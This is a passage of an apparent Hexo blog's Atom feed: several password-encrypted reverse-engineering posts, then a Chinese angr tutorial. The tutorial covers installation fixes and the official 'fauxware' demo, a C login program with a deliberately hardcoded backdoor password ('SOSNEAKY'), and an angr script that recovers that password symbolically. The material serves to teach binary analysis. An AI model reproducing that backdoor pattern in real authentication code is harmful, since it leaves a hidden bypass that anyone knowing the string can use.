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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="AutoJS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python 